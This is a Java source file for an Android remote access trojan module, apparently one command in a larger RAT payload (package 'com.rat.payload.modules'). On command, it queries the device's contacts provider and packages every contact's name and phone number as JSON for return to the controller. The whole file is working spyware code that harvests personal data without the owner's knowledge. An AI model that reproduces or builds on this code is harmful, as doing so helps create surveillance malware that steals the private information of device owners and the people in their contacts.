package com.rat.payload.modules;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONObject;

public class GetContacts implements CommandHandler.Command {

    private Context context;

    public GetContacts(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    @Override
    public JSONObject execute(JSONObject args) {
        JSONObject result = new JSONObject();
        JSONArray contacts = new JSONArray();
        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact.put("name", name);
                    contact.put("number", number);
                    contacts.put(contact);
                }
                cursor.close();
            }
            result.put("contacts", contacts);
            result.put("count", contacts.length());
        } catch (Exception e) {
            try { result.put("error", e.getMessage()); } catch (Exception ignored) {}
        }
        return result;
    }
}
